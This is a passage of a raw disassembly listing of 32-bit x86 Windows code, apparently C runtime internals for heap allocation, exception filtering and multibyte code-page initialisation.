  407082:	89 0a                	mov    %ecx,(%edx)
  407084:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  407088:	8b 75 f4             	mov    -0xc(%ebp),%esi
  40708b:	8b 0e                	mov    (%esi),%ecx
  40708d:	85 c9                	test   %ecx,%ecx
  40708f:	8d 79 01             	lea    0x1(%ecx),%edi
  407092:	89 3e                	mov    %edi,(%esi)
  407094:	75 1a                	jne    0x4070b0
  407096:	3b 1d d4 c3 40 00    	cmp    0x40c3d4,%ebx
  40709c:	75 12                	jne    0x4070b0
  40709e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4070a1:	3b 0d cc c3 40 00    	cmp    0x40c3cc,%ecx
  4070a7:	75 07                	jne    0x4070b0
  4070a9:	83 25 d4 c3 40 00 00 	andl   $0x0,0x40c3d4
  4070b0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4070b3:	89 08                	mov    %ecx,(%eax)
  4070b5:	8d 42 04             	lea    0x4(%edx),%eax
  4070b8:	5f                   	pop    %edi
  4070b9:	5e                   	pop    %esi
  4070ba:	5b                   	pop    %ebx
  4070bb:	c9                   	leave
  4070bc:	c3                   	ret
  4070bd:	a1 d8 c3 40 00       	mov    0x40c3d8,%eax
  4070c2:	8b 0d c8 c3 40 00    	mov    0x40c3c8,%ecx
  4070c8:	56                   	push   %esi
  4070c9:	57                   	push   %edi
  4070ca:	33 ff                	xor    %edi,%edi
  4070cc:	3b c1                	cmp    %ecx,%eax
  4070ce:	75 30                	jne    0x407100
  4070d0:	8d 44 89 50          	lea    0x50(%ecx,%ecx,4),%eax
  4070d4:	c1 e0 02             	shl    $0x2,%eax
  4070d7:	50                   	push   %eax
  4070d8:	ff 35 dc c3 40 00    	push   0x40c3dc
  4070de:	57                   	push   %edi
  4070df:	ff 35 e0 c3 40 00    	push   0x40c3e0
  4070e5:	ff 15 d8 90 40 00    	call   *0x4090d8
  4070eb:	3b c7                	cmp    %edi,%eax
  4070ed:	74 61                	je     0x407150
  4070ef:	83 05 c8 c3 40 00 10 	addl   $0x10,0x40c3c8
  4070f6:	a3 dc c3 40 00       	mov    %eax,0x40c3dc
  4070fb:	a1 d8 c3 40 00       	mov    0x40c3d8,%eax
  407100:	8b 0d dc c3 40 00    	mov    0x40c3dc,%ecx
  407106:	68 c4 41 00 00       	push   $0x41c4
  40710b:	6a 08                	push   $0x8
  40710d:	8d 04 80             	lea    (%eax,%eax,4),%eax
  407110:	ff 35 e0 c3 40 00    	push   0x40c3e0
  407116:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  407119:	ff 15 90 90 40 00    	call   *0x409090
  40711f:	3b c7                	cmp    %edi,%eax
  407121:	89 46 10             	mov    %eax,0x10(%esi)
  407124:	74 2a                	je     0x407150
  407126:	6a 04                	push   $0x4
  407128:	68 00 20 00 00       	push   $0x2000
  40712d:	68 00 00 10 00       	push   $0x100000
  407132:	57                   	push   %edi
  407133:	ff 15 d4 90 40 00    	call   *0x4090d4
  407139:	3b c7                	cmp    %edi,%eax
  40713b:	89 46 0c             	mov    %eax,0xc(%esi)
  40713e:	75 14                	jne    0x407154
  407140:	ff 76 10             	push   0x10(%esi)
  407143:	57                   	push   %edi
  407144:	ff 35 e0 c3 40 00    	push   0x40c3e0
  40714a:	ff 15 94 90 40 00    	call   *0x409094
  407150:	33 c0                	xor    %eax,%eax
  407152:	eb 17                	jmp    0x40716b
  407154:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  407158:	89 3e                	mov    %edi,(%esi)
  40715a:	89 7e 04             	mov    %edi,0x4(%esi)
  40715d:	ff 05 d8 c3 40 00    	incl   0x40c3d8
  407163:	8b 46 10             	mov    0x10(%esi),%eax
  407166:	83 08 ff             	orl    $0xffffffff,(%eax)
  407169:	8b c6                	mov    %esi,%eax
  40716b:	5f                   	pop    %edi
  40716c:	5e                   	pop    %esi
  40716d:	c3                   	ret
  40716e:	55                   	push   %ebp
  40716f:	8b ec                	mov    %esp,%ebp
  407171:	51                   	push   %ecx
  407172:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407175:	53                   	push   %ebx
  407176:	56                   	push   %esi
  407177:	57                   	push   %edi
  407178:	8b 71 10             	mov    0x10(%ecx),%esi
  40717b:	8b 41 08             	mov    0x8(%ecx),%eax
  40717e:	33 db                	xor    %ebx,%ebx
  407180:	85 c0                	test   %eax,%eax
  407182:	7c 05                	jl     0x407189
  407184:	d1 e0                	shl    $1,%eax
  407186:	43                   	inc    %ebx
  407187:	eb f7                	jmp    0x407180
  407189:	8b c3                	mov    %ebx,%eax
  40718b:	6a 3f                	push   $0x3f
  40718d:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  407193:	5a                   	pop    %edx
  407194:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  40719b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40719e:	89 40 08             	mov    %eax,0x8(%eax)
  4071a1:	89 40 04             	mov    %eax,0x4(%eax)
  4071a4:	83 c0 08             	add    $0x8,%eax
  4071a7:	4a                   	dec    %edx
  4071a8:	75 f4                	jne    0x40719e
  4071aa:	8b fb                	mov    %ebx,%edi
  4071ac:	6a 04                	push   $0x4
  4071ae:	c1 e7 0f             	shl    $0xf,%edi
  4071b1:	03 79 0c             	add    0xc(%ecx),%edi
  4071b4:	68 00 10 00 00       	push   $0x1000
  4071b9:	68 00 80 00 00       	push   $0x8000
  4071be:	57                   	push   %edi
  4071bf:	ff 15 d4 90 40 00    	call   *0x4090d4
  4071c5:	85 c0                	test   %eax,%eax
  4071c7:	75 08                	jne    0x4071d1
  4071c9:	83 c8 ff             	or     $0xffffffff,%eax
  4071cc:	e9 93 00 00 00       	jmp    0x407264
  4071d1:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  4071d7:	3b fa                	cmp    %edx,%edi
  4071d9:	77 3c                	ja     0x407217
  4071db:	8d 47 10             	lea    0x10(%edi),%eax
  4071de:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  4071e2:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  4071e9:	8d 88 fc 0f 00 00    	lea    0xffc(%eax),%ecx
  4071ef:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  4071f6:	89 08                	mov    %ecx,(%eax)
  4071f8:	8d 88 fc ef ff ff    	lea    -0x1004(%eax),%ecx
  4071fe:	89 48 04             	mov    %ecx,0x4(%eax)
  407201:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  407208:	0f 00 00 
  40720b:	05 00 10 00 00       	add    $0x1000,%eax
  407210:	8d 48 f0             	lea    -0x10(%eax),%ecx
  407213:	3b ca                	cmp    %edx,%ecx
  407215:	76 c7                	jbe    0x4071de
  407217:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40721a:	8d 4f 0c             	lea    0xc(%edi),%ecx
  40721d:	05 f8 01 00 00       	add    $0x1f8,%eax
  407222:	6a 01                	push   $0x1
  407224:	5f                   	pop    %edi
  407225:	89 48 04             	mov    %ecx,0x4(%eax)
  407228:	89 41 08             	mov    %eax,0x8(%ecx)
  40722b:	8d 4a 0c             	lea    0xc(%edx),%ecx
  40722e:	89 48 08             	mov    %ecx,0x8(%eax)
  407231:	89 41 04             	mov    %eax,0x4(%ecx)
  407234:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  407239:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  407240:	8a 46 43             	mov    0x43(%esi),%al
  407243:	8a c8                	mov    %al,%cl
  407245:	fe c1                	inc    %cl
  407247:	84 c0                	test   %al,%al
  407249:	8b 45 08             	mov    0x8(%ebp),%eax
  40724c:	88 4e 43             	mov    %cl,0x43(%esi)
  40724f:	75 03                	jne    0x407254
  407251:	09 78 04             	or     %edi,0x4(%eax)
  407254:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407259:	8b cb                	mov    %ebx,%ecx
  40725b:	d3 ea                	shr    %cl,%edx
  40725d:	f7 d2                	not    %edx
  40725f:	21 50 08             	and    %edx,0x8(%eax)
  407262:	8b c3                	mov    %ebx,%eax
  407264:	5f                   	pop    %edi
  407265:	5e                   	pop    %esi
  407266:	5b                   	pop    %ebx
  407267:	c9                   	leave
  407268:	c3                   	ret
  407269:	56                   	push   %esi
  40726a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40726e:	8b 06                	mov    (%esi),%eax
  407270:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  407276:	75 14                	jne    0x40728c
  407278:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40727c:	75 0e                	jne    0x40728c
  40727e:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  407285:	75 05                	jne    0x40728c
  407287:	e9 70 e7 ff ff       	jmp    0x4059fc
  40728c:	a1 54 c1 40 00       	mov    0x40c154,%eax
  407291:	85 c0                	test   %eax,%eax
  407293:	74 14                	je     0x4072a9
  407295:	50                   	push   %eax
  407296:	e8 6a 00 00 00       	call   0x407305
  40729b:	85 c0                	test   %eax,%eax
  40729d:	59                   	pop    %ecx
  40729e:	74 09                	je     0x4072a9
  4072a0:	56                   	push   %esi
  4072a1:	ff 15 54 c1 40 00    	call   *0x40c154
  4072a7:	eb 02                	jmp    0x4072ab
  4072a9:	33 c0                	xor    %eax,%eax
  4072ab:	5e                   	pop    %esi
  4072ac:	c2 04 00             	ret    $0x4
  4072af:	68 69 72 40 00       	push   $0x407269
  4072b4:	ff 15 e0 90 40 00    	call   *0x4090e0
  4072ba:	a3 54 c1 40 00       	mov    %eax,0x40c154
  4072bf:	c3                   	ret
  4072c0:	ff 35 54 c1 40 00    	push   0x40c154
  4072c6:	ff 15 e0 90 40 00    	call   *0x4090e0
  4072cc:	c3                   	ret
  4072cd:	56                   	push   %esi
  4072ce:	6a 01                	push   $0x1
  4072d0:	5e                   	pop    %esi
  4072d1:	ff 74 24 0c          	push   0xc(%esp)
  4072d5:	ff 74 24 0c          	push   0xc(%esp)
  4072d9:	ff 15 e4 90 40 00    	call   *0x4090e4
  4072df:	85 c0                	test   %eax,%eax
  4072e1:	74 02                	je     0x4072e5
  4072e3:	33 f6                	xor    %esi,%esi
  4072e5:	8b c6                	mov    %esi,%eax
  4072e7:	5e                   	pop    %esi
  4072e8:	c3                   	ret
  4072e9:	56                   	push   %esi
  4072ea:	6a 01                	push   $0x1
  4072ec:	5e                   	pop    %esi
  4072ed:	ff 74 24 0c          	push   0xc(%esp)
  4072f1:	ff 74 24 0c          	push   0xc(%esp)
  4072f5:	ff 15 dc 90 40 00    	call   *0x4090dc
  4072fb:	85 c0                	test   %eax,%eax
  4072fd:	74 02                	je     0x407301
  4072ff:	33 f6                	xor    %esi,%esi
  407301:	8b c6                	mov    %esi,%eax
  407303:	5e                   	pop    %esi
  407304:	c3                   	ret
  407305:	56                   	push   %esi
  407306:	6a 01                	push   $0x1
  407308:	5e                   	pop    %esi
  407309:	ff 74 24 08          	push   0x8(%esp)
  40730d:	ff 15 e8 90 40 00    	call   *0x4090e8
  407313:	85 c0                	test   %eax,%eax
  407315:	74 02                	je     0x407319
  407317:	33 f6                	xor    %esi,%esi
  407319:	8b c6                	mov    %esi,%eax
  40731b:	5e                   	pop    %esi
  40731c:	c3                   	ret
  40731d:	6a 0a                	push   $0xa
  40731f:	e8 f1 ef ff ff       	call   0x406315
  407324:	6a 16                	push   $0x16
  407326:	e8 dd 07 00 00       	call   0x407b08
  40732b:	59                   	pop    %ecx
  40732c:	59                   	pop    %ecx
  40732d:	6a 03                	push   $0x3
  40732f:	e8 b2 e7 ff ff       	call   0x405ae6
  407334:	6a 04                	push   $0x4
  407336:	6a 00                	push   $0x0
  407338:	ff 74 24 0c          	push   0xc(%esp)
  40733c:	e8 04 00 00 00       	call   0x407345
  407341:	83 c4 0c             	add    $0xc,%esp
  407344:	c3                   	ret
  407345:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  40734a:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  40734e:	84 88 c1 c2 40 00    	test   %cl,0x40c2c1(%eax)
  407354:	75 1c                	jne    0x407372
  407356:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40735b:	74 0e                	je     0x40736b
  40735d:	0f b7 04 45 92 bc 40 	movzwl 0x40bc92(,%eax,2),%eax
  407364:	00 
  407365:	23 44 24 08          	and    0x8(%esp),%eax
  407369:	eb 02                	jmp    0x40736d
  40736b:	33 c0                	xor    %eax,%eax
  40736d:	85 c0                	test   %eax,%eax
  40736f:	75 01                	jne    0x407372
  407371:	c3                   	ret
  407372:	6a 01                	push   $0x1
  407374:	58                   	pop    %eax
  407375:	c3                   	ret
  407376:	55                   	push   %ebp
  407377:	8b ec                	mov    %esp,%ebp
  407379:	83 ec 18             	sub    $0x18,%esp
  40737c:	53                   	push   %ebx
  40737d:	56                   	push   %esi
  40737e:	57                   	push   %edi
  40737f:	ff 75 08             	push   0x8(%ebp)
  407382:	e8 88 01 00 00       	call   0x40750f
  407387:	8b f0                	mov    %eax,%esi
  407389:	59                   	pop    %ecx
  40738a:	3b 35 a4 c1 40 00    	cmp    0x40c1a4,%esi
  407390:	89 75 08             	mov    %esi,0x8(%ebp)
  407393:	0f 84 6a 01 00 00    	je     0x407503
  407399:	33 db                	xor    %ebx,%ebx
  40739b:	3b f3                	cmp    %ebx,%esi
  40739d:	0f 84 56 01 00 00    	je     0x4074f9
  4073a3:	33 d2                	xor    %edx,%edx
  4073a5:	b8 b0 be 40 00       	mov    $0x40beb0,%eax
  4073aa:	39 30                	cmp    %esi,(%eax)
  4073ac:	74 72                	je     0x407420
  4073ae:	83 c0 30             	add    $0x30,%eax
  4073b1:	42                   	inc    %edx
  4073b2:	3d a0 bf 40 00       	cmp    $0x40bfa0,%eax
  4073b7:	7c f1                	jl     0x4073aa
  4073b9:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4073bc:	50                   	push   %eax
  4073bd:	56                   	push   %esi
  4073be:	ff 15 ec 90 40 00    	call   *0x4090ec
  4073c4:	83 f8 01             	cmp    $0x1,%eax
  4073c7:	0f 85 24 01 00 00    	jne    0x4074f1
  4073cd:	6a 40                	push   $0x40
  4073cf:	33 c0                	xor    %eax,%eax
  4073d1:	59                   	pop    %ecx
  4073d2:	bf c0 c2 40 00       	mov    $0x40c2c0,%edi
  4073d7:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4073db:	89 35 a4 c1 40 00    	mov    %esi,0x40c1a4
  4073e1:	f3 ab                	rep stos %eax,%es:(%edi)
  4073e3:	aa                   	stos   %al,%es:(%edi)
  4073e4:	89 1d c4 c3 40 00    	mov    %ebx,0x40c3c4
  4073ea:	0f 86 ef 00 00 00    	jbe    0x4074df
  4073f0:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  4073f4:	0f 84 bb 00 00 00    	je     0x4074b5
  4073fa:	8d 4d ef             	lea    -0x11(%ebp),%ecx
  4073fd:	8a 11                	mov    (%ecx),%dl
  4073ff:	84 d2                	test   %dl,%dl
  407401:	0f 84 ae 00 00 00    	je     0x4074b5
  407407:	0f b6 41 ff          	movzbl -0x1(%ecx),%eax
  40740b:	0f b6 d2             	movzbl %dl,%edx
  40740e:	3b c2                	cmp    %edx,%eax
  407410:	0f 87 93 00 00 00    	ja     0x4074a9
  407416:	80 88 c1 c2 40 00 04 	orb    $0x4,0x40c2c1(%eax)
  40741d:	40                   	inc    %eax
  40741e:	eb ee                	jmp    0x40740e
  407420:	6a 40                	push   $0x40
  407422:	33 c0                	xor    %eax,%eax
  407424:	59                   	pop    %ecx
  407425:	bf c0 c2 40 00       	mov    $0x40c2c0,%edi
  40742a:	f3 ab                	rep stos %eax,%es:(%edi)
  40742c:	8d 34 52             	lea    (%edx,%edx,2),%esi
  40742f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407432:	c1 e6 04             	shl    $0x4,%esi
  407435:	aa                   	stos   %al,%es:(%edi)
  407436:	8d 9e c0 be 40 00    	lea    0x40bec0(%esi),%ebx
  40743c:	80 3b 00             	cmpb   $0x0,(%ebx)
  40743f:	8b cb                	mov    %ebx,%ecx
  407441:	74 2c                	je     0x40746f
  407443:	8a 51 01             	mov    0x1(%ecx),%dl
  407446:	84 d2                	test   %dl,%dl
  407448:	74 25                	je     0x40746f
  40744a:	0f b6 01             	movzbl (%ecx),%eax
  40744d:	0f b6 fa             	movzbl %dl,%edi
  407450:	3b c7                	cmp    %edi,%eax
  407452:	77 14                	ja     0x407468
  407454:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407457:	8a 92 a8 be 40 00    	mov    0x40bea8(%edx),%dl
  40745d:	08 90 c1 c2 40 00    	or     %dl,0x40c2c1(%eax)
  407463:	40                   	inc    %eax
  407464:	3b c7                	cmp    %edi,%eax
  407466:	76 f5                	jbe    0x40745d
  407468:	41                   	inc    %ecx
  407469:	41                   	inc    %ecx
  40746a:	80 39 00             	cmpb   $0x0,(%ecx)
  40746d:	75 d4                	jne    0x407443
  40746f:	ff 45 fc             	incl   -0x4(%ebp)
  407472:	83 c3 08             	add    $0x8,%ebx
  407475:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  407479:	72 c1                	jb     0x40743c
  40747b:	8b 45 08             	mov    0x8(%ebp),%eax
  40747e:	c7 05 bc c1 40 00 01 	movl   $0x1,0x40c1bc
  407485:	00 00 00 
  407488:	50                   	push   %eax
  407489:	a3 a4 c1 40 00       	mov    %eax,0x40c1a4
  40748e:	e8 c6 00 00 00       	call   0x407559
  407493:	8d b6 b4 be 40 00    	lea    0x40beb4(%esi),%esi
  407499:	bf b0 c1 40 00       	mov    $0x40c1b0,%edi
  40749e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40749f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4074a0:	59                   	pop    %ecx
  4074a1:	a3 c4 c3 40 00       	mov    %eax,0x40c3c4
  4074a6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4074a7:	eb 55                	jmp    0x4074fe
  4074a9:	41                   	inc    %ecx
  4074aa:	41                   	inc    %ecx
  4074ab:	80 79 ff 00          	cmpb   $0x0,-0x1(%ecx)
  4074af:	0f 85 48 ff ff ff    	jne    0x4073fd
  4074b5:	6a 01                	push   $0x1
  4074b7:	58                   	pop    %eax
  4074b8:	80 88 c1 c2 40 00 08 	orb    $0x8,0x40c2c1(%eax)
  4074bf:	40                   	inc    %eax
  4074c0:	3d ff 00 00 00       	cmp    $0xff,%eax
  4074c5:	72 f1                	jb     0x4074b8
  4074c7:	56                   	push   %esi
  4074c8:	e8 8c 00 00 00       	call   0x407559
  4074cd:	59                   	pop    %ecx
  4074ce:	a3 c4 c3 40 00       	mov    %eax,0x40c3c4
  4074d3:	c7 05 bc c1 40 00 01 	movl   $0x1,0x40c1bc
  4074da:	00 00 00 
  4074dd:	eb 06                	jmp    0x4074e5
  4074df:	89 1d bc c1 40 00    	mov    %ebx,0x40c1bc
  4074e5:	33 c0                	xor    %eax,%eax
  4074e7:	bf b0 c1 40 00       	mov    $0x40c1b0,%edi
  4074ec:	ab                   	stos   %eax,%es:(%edi)
  4074ed:	ab                   	stos   %eax,%es:(%edi)
  4074ee:	ab                   	stos   %eax,%es:(%edi)
  4074ef:	eb 0d                	jmp    0x4074fe
  4074f1:	39 1d 58 c1 40 00    	cmp    %ebx,0x40c158
  4074f7:	74 0e                	je     0x407507
  4074f9:	e8 8e 00 00 00       	call   0x40758c
  4074fe:	e8 b2 00 00 00       	call   0x4075b5
  407503:	33 c0                	xor    %eax,%eax
  407505:	eb 03                	jmp    0x40750a
  407507:	83 c8 ff             	or     $0xffffffff,%eax
  40750a:	5f                   	pop    %edi
  40750b:	5e                   	pop    %esi
  40750c:	5b                   	pop    %ebx
  40750d:	c9                   	leave
  40750e:	c3                   	ret
  40750f:	8b 44 24 04          	mov    0x4(%esp),%eax
  407513:	83 25 58 c1 40 00 00 	andl   $0x0,0x40c158
  40751a:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40751d:	75 10                	jne    0x40752f
  40751f:	c7 05 58 c1 40 00 01 	movl   $0x1,0x40c158
  407526:	00 00 00 
  407529:	ff 25 f4 90 40 00    	jmp    *0x4090f4
  40752f:	83 f8 fd             	cmp    $0xfffffffd,%eax
  407532:	75 10                	jne    0x407544
  407534:	c7 05 58 c1 40 00 01 	movl   $0x1,0x40c158
  40753b:	00 00 00 
  40753e:	ff 25 f0 90 40 00    	jmp    *0x4090f0
  407544:	83 f8 fc             	cmp    $0xfffffffc,%eax
  407547:	75 0f                	jne    0x407558
  407549:	a1 98 c1 40 00       	mov    0x40c198,%eax
  40754e:	c7 05 58 c1 40 00 01 	movl   $0x1,0x40c158
  407555:	00 00 00 
  407558:	c3                   	ret
  407559:	8b 44 24 04          	mov    0x4(%esp),%eax
  40755d:	2d a4 03 00 00       	sub    $0x3a4,%eax
  407562:	74 22                	je     0x407586
  407564:	83 e8 04             	sub    $0x4,%eax
  407567:	74 17                	je     0x407580
  407569:	83 e8 0d             	sub    $0xd,%eax
  40756c:	74 0c                	je     0x40757a
  40756e:	48                   	dec    %eax
  40756f:	74 03                	je     0x407574
  407571:	33 c0                	xor    %eax,%eax
  407573:	c3                   	ret
  407574:	b8 04 04 00 00       	mov    $0x404,%eax
  407579:	c3                   	ret
  40757a:	b8 12 04 00 00       	mov    $0x412,%eax
  40757f:	c3                   	ret
  407580:	b8 04 08 00 00       	mov    $0x804,%eax
  407585:	c3                   	ret
  407586:	b8 11 04 00 00       	mov    $0x411,%eax
  40758b:	c3                   	ret
  40758c:	57                   	push   %edi
  40758d:	6a 40                	push   $0x40
  40758f:	59                   	pop    %ecx
  407590:	33 c0                	xor    %eax,%eax
  407592:	bf c0 c2 40 00       	mov    $0x40c2c0,%edi
  407597:	f3 ab                	rep stos %eax,%es:(%edi)
  407599:	aa                   	stos   %al,%es:(%edi)
  40759a:	33 c0                	xor    %eax,%eax
  40759c:	bf b0 c1 40 00       	mov    $0x40c1b0,%edi
  4075a1:	a3 a4 c1 40 00       	mov    %eax,0x40c1a4
  4075a6:	a3 bc c1 40 00       	mov    %eax,0x40c1bc
  4075ab:	a3 c4 c3 40 00       	mov    %eax,0x40c3c4
  4075b0:	ab                   	stos   %eax,%es:(%edi)
  4075b1:	ab                   	stos   %eax,%es:(%edi)
  4075b2:	ab                   	stos   %eax,%es:(%edi)
  4075b3:	5f                   	pop    %edi
  4075b4:	c3                   	ret
  4075b5:	55                   	push   %ebp
  4075b6:	8b ec                	mov    %esp,%ebp
  4075b8:	81 ec 14 05 00 00    	sub    $0x514,%esp
  4075be:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4075c1:	56                   	push   %esi
  4075c2:	50                   	push   %eax
  4075c3:	ff 35 a4 c1 40 00    	push   0x40c1a4
  4075c9:	ff 15 ec 90 40 00    	call   *0x4090ec
  4075cf:	83 f8 01             	cmp    $0x1,%eax
  4075d2:	0f 85 16 01 00 00    	jne    0x4076ee
  4075d8:	33 c0                	xor    %eax,%eax
  4075da:	be 00 01 00 00       	mov    $0x100,%esi
  4075df:	88 84 05 ec fe ff ff 	mov    %al,-0x114(%ebp,%eax,1)
  4075e6:	40                   	inc    %eax
  4075e7:	3b c6                	cmp    %esi,%eax
  4075e9:	72 f4                	jb     0x4075df
  4075eb:	8a 45 f2             	mov    -0xe(%ebp),%al
  4075ee:	c6 85 ec fe ff ff 20 	movb   $0x20,-0x114(%ebp)
  4075f5:	84 c0                	test   %al,%al
  4075f7:	74 37                	je     0x407630
  4075f9:	53                   	push   %ebx
  4075fa:	57                   	push   %edi
  4075fb:	8d 55 f3             	lea    -0xd(%ebp),%edx
  4075fe:	0f b6 0a             	movzbl (%edx),%ecx
  407601:	0f b6 c0             	movzbl %al,%eax
  407604:	3b c1                	cmp    %ecx,%eax
  407606:	77 1d                	ja     0x407625
  407608:	2b c8                	sub    %eax,%ecx
  40760a:	8d bc 05 ec fe ff ff 	lea    -0x114(%ebp,%eax,1),%edi
  407611:	41                   	inc    %ecx
  407612:	b8 20 20 20 20       	mov    $0x20202020,%eax
  407617:	8b d9                	mov    %ecx,%ebx
  407619:	c1 e9 02             	shr    $0x2,%ecx
  40761c:	f3 ab                	rep stos %eax,%es:(%edi)
  40761e:	8b cb                	mov    %ebx,%ecx
  407620:	83 e1 03             	and    $0x3,%ecx
  407623:	f3 aa                	rep stos %al,%es:(%edi)
  407625:	42                   	inc    %edx
  407626:	42                   	inc    %edx
  407627:	8a 42 ff             	mov    -0x1(%edx),%al
  40762a:	84 c0                	test   %al,%al
  40762c:	75 d0                	jne    0x4075fe
  40762e:	5f                   	pop    %edi
  40762f:	5b                   	pop    %ebx
  407630:	6a 00                	push   $0x0
  407632:	8d 85 ec fa ff ff    	lea    -0x514(%ebp),%eax
  407638:	ff 35 c4 c3 40 00    	push   0x40c3c4
  40763e:	ff 35 a4 c1 40 00    	push   0x40c1a4
  407644:	50                   	push   %eax
  407645:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40764b:	56                   	push   %esi
  40764c:	50                   	push   %eax
  40764d:	6a 01                	push   $0x1
  40764f:	e8 6b 03 00 00       	call   0x4079bf
  407654:	6a 00                	push   $0x0
  407656:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40765c:	ff 35 a4 c1 40 00    	push   0x40c1a4
  407662:	56                   	push   %esi
  407663:	50                   	push   %eax
  407664:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40766a:	56                   	push   %esi
  40766b:	50                   	push   %eax
  40766c:	56                   	push   %esi
  40766d:	ff 35 c4 c3 40 00    	push   0x40c3c4
  407673:	e8 02 06 00 00       	call   0x407c7a
  407678:	6a 00                	push   $0x0
  40767a:	8d 85 ec fc ff ff    	lea    -0x314(%ebp),%eax
  407680:	ff 35 a4 c1 40 00    	push   0x40c1a4
  407686:	56                   	push   %esi
  407687:	50                   	push   %eax
  407688:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40768e:	56                   	push   %esi
  40768f:	50                   	push   %eax
  407690:	68 00 02 00 00       	push   $0x200
  407695:	ff 35 c4 c3 40 00    	push   0x40c3c4
  40769b:	e8 da 05 00 00       	call   0x407c7a
  4076a0:	83 c4 5c             	add    $0x5c,%esp
  4076a3:	33 c0                	xor    %eax,%eax
  4076a5:	8d 8d ec fa ff ff    	lea    -0x514(%ebp),%ecx
  4076ab:	66 8b 11             	mov    (%ecx),%dx
  4076ae:	f6 c2 01             	test   $0x1,%dl
  4076b1:	74 16                	je     0x4076c9
  4076b3:	80 88 c1 c2 40 00 10 	orb    $0x10,0x40c2c1(%eax)
  4076ba:	8a 94 05 ec fd ff ff 	mov    -0x214(%ebp,%eax,1),%dl
  4076c1:	88 90 c0 c1 40 00    	mov    %dl,0x40c1c0(%eax)
  4076c7:	eb 1c                	jmp    0x4076e5
  4076c9:	f6 c2 02             	test   $0x2,%dl
  4076cc:	74 10                	je     0x4076de
  4076ce:	80 88 c1 c2 40 00 20 	orb    $0x20,0x40c2c1(%eax)
  4076d5:	8a 94 05 ec fc ff ff 	mov    -0x314(%ebp,%eax,1),%dl
  4076dc:	eb e3                	jmp    0x4076c1
  4076de:	80 a0 c0 c1 40 00 00 	andb   $0x0,0x40c1c0(%eax)
  4076e5:	40                   	inc    %eax
  4076e6:	41                   	inc    %ecx
  4076e7:	41                   	inc    %ecx
  4076e8:	3b c6                	cmp    %esi,%eax
  4076ea:	72 bf                	jb     0x4076ab
  4076ec:	eb 49                	jmp    0x407737
  4076ee:	33 c0                	xor    %eax,%eax
  4076f0:	be 00 01 00 00       	mov    $0x100,%esi
  4076f5:	83 f8 41             	cmp    $0x41,%eax
  4076f8:	72 19                	jb     0x407713
  4076fa:	83 f8 5a             	cmp    $0x5a,%eax
  4076fd:	77 14                	ja     0x407713
  4076ff:	80 88 c1 c2 40 00 10 	orb    $0x10,0x40c2c1(%eax)
  407706:	8a c8                	mov    %al,%cl
  407708:	80 c1 20             	add    $0x20,%cl
  40770b:	88 88 c0 c1 40 00    	mov    %cl,0x40c1c0(%eax)
  407711:	eb 1f                	jmp    0x407732
  407713:	83 f8 61             	cmp    $0x61,%eax
  407716:	72 13                	jb     0x40772b
  407718:	83 f8 7a             	cmp    $0x7a,%eax
  40771b:	77 0e                	ja     0x40772b
  40771d:	80 88 c1 c2 40 00 20 	orb    $0x20,0x40c2c1(%eax)
  407724:	8a c8                	mov    %al,%cl
  407726:	80 e9 20             	sub    $0x20,%cl
  407729:	eb e0                	jmp    0x40770b
  40772b:	80 a0 c0 c1 40 00 00 	andb   $0x0,0x40c1c0(%eax)
  407732:	40                   	inc    %eax
  407733:	3b c6                	cmp    %esi,%eax
  407735:	72 be                	jb     0x4076f5
  407737:	5e                   	pop    %esi
  407738:	c9                   	leave
  407739:	c3                   	ret
  40773a:	83 3d e8 c3 40 00 00 	cmpl   $0x0,0x40c3e8
  407741:	75 12                	jne    0x407755
  407743:	6a fd                	push   $0xfffffffd
  407745:	e8 2c fc ff ff       	call   0x407376
  40774a:	59                   	pop    %ecx
  40774b:	c7 05 e8 c3 40 00 01 	movl   $0x1,0x40c3e8
  407752:	00 00 00 
  407755:	c3                   	ret
  407756:	53                   	push   %ebx
  407757:	33 db                	xor    %ebx,%ebx
  407759:	39 1d 5c c1 40 00    	cmp    %ebx,0x40c15c
  40775f:	56                   	push   %esi
  407760:	57                   	push   %edi
  407761:	75 42                	jne    0x4077a5
  407763:	68 d0 95 40 00       	push   $0x4095d0
  407768:	ff 15 fc 90 40 00    	call   *0x4090fc
